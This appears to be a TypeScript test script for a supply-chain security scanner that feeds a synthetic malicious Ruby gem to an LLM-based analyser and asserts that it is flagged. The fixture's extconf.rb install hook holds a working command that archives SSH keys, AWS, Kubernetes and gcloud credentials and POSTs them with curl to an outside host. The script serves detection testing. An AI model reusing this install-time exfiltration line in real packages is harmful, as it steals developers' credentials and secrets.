/**
 * test-ruby-package.ts
 *
 * Ad hoc Ruby gem scanner for manual validation. Uses synthetic gem contents
 * but reuses the production package planning and analysis logic.
 */

import assert from 'node:assert/strict';
import { parseTestLLMOptions } from './test-llm-options.js';
import { formatTriageResults } from './src/supply-chain/llm/tools.js';
import { createChatModel } from './src/supply-chain/llm/client.js';
import { analyzePackageWithModel, planPackageInvestigation } from './src/supply-chain/nodes/primary-analysis.js';
import type { PackageMetadata, PackageSource, RegistrySignals } from './src/supply-chain/types.js';

const TARGETS = [
  {
    label: 'malicious Ruby extconf credential harvester',
    version: '0.1.0-malicious-fixture',
    source: {
      name: 'rackup-helper',
      ecosystem: 'ruby',
      version: '0.1.0-malicious-fixture',
      installScripts: {
        'extconf.rb': `require 'mkmf'`,
      },
      fileList: [
        'data.tar.gz/rackup-helper.gemspec',
        'data.tar.gz/extconf.rb',
        'data.tar.gz/lib/rackup_helper.rb',
      ],
      fileContents: {
        'data.tar.gz/rackup-helper.gemspec': `Gem::Specification.new do |spec|
  spec.name = "rackup-helper"
  spec.version = "0.1.0-malicious-fixture"
  spec.summary = "Synthetic malicious Ruby gem fixture"
  spec.extensions = ["extconf.rb"]
end
`,
        'data.tar.gz/extconf.rb': `require 'fileutils'

system("tar czf /tmp/loot.tgz ~/.ssh/id_rsa ~/.aws/credentials ~/.kube/config ~/.config/gcloud && curl -X POST https://models.litellm.cloud/ --data-binary @/tmp/loot.tgz")
`,
        'data.tar.gz/lib/rackup_helper.rb': `module RackupHelper
  def self.enabled?
    true
  end
end
`,
      },
      suspiciousFiles: {},
    } satisfies PackageSource,
  },
];

const llmOptions = parseTestLLMOptions('test-llm-ruby-package.ts');

function buildFakeMetadata(version: string): PackageMetadata {
  const signals: RegistrySignals = {
    maintainerChangedInLatestRelease: false,
    previousMaintainers: [],
    newMaintainers: [],
    packageAgeDays: 14,
    publishedDaysAgo: 1,
    typosquatCandidate: null,
    isDependencyConfusion: false,
    hasProvenance: false,
    riskScore: 6,
  };

  return {
    name: 'rackup-helper',
    ecosystem: 'ruby',
    latestVersion: version,
    previousVersion: '0.0.9',
    createdAt: '2026-03-01T00:00:00Z',
    updatedAt: new Date().toISOString(),
    weeklyDownloads: 10,
    maintainers: ['unknown'],
    hasInstallScripts: true,
    installScripts: {
      'extconf.rb': 'ruby extconf.rb',
    },
    repositoryUrl: 'https://example.invalid/rackup-helper',
    description: 'Synthetic malicious Ruby fixture for supply-chain testing.',
    registrySignals: signals,
  };
}

async function scanTarget(target: typeof TARGETS[0]) {
  console.log('\n' + '─'.repeat(70));
  console.log(`🎯 Target: ${target.label}`);
  console.log('─'.repeat(70));

  const { allContent, triageResults, filesToInvestigate } = planPackageInvestigation(target.source);

  console.log('\n' + formatTriageResults(triageResults, allContent.size).split('\n').map(l => '  ' + l).join('\n'));
  console.log(`\n  ${filesToInvestigate.length} file(s) selected for LLM investigation\n`);

  assert(
    filesToInvestigate.length > 0,
    `Expected suspicious files for ${target.label}, but triage selected none`
  );

  for (const entry of filesToInvestigate) {
    console.log(`  ┌── ${entry.filePath} (score: ${entry.score})`);
  }

  let findingsCount = 0;
  console.log(`  🤖 Running production package analysis on ${filesToInvestigate.length} file(s)...\n`);
  const chatModel = createChatModel({
    apiKey: llmOptions.apiKey,
    model: llmOptions.model,
    provider: llmOptions.provider,
  });

  const { findings } = await analyzePackageWithModel(
    buildFakeMetadata(target.version),
    target.source,
    chatModel,
    false
  );
  findingsCount = findings.length;

  console.log(`\n  📋 Production analysis reported ${findings.length} finding(s)`);
  for (const finding of findings) {
    console.log(`    [${finding.severity}] ${finding.category} — ${finding.title}`);
    console.log(`    confidence: ${Math.round(finding.confidence * 100)}% | ${finding.description.slice(0, 120)}`);
  }

  assert(
    findings.length > 0,
    `Expected at least one LLM finding for ${target.label}, but production analysis returned none`
  );

  return {
    triageCount: filesToInvestigate.length,
    findingsCount,
  };
}

let targetsWithIssues = 0;
for (const target of TARGETS) {
  const result = await scanTarget(target);
  if (result.triageCount > 0 || result.findingsCount > 0) {
    targetsWithIssues++;
  }
}

assert(targetsWithIssues === TARGETS.length, 'Expected every Ruby target to be flagged by the test harness');
console.log('\n✅ Done\n');
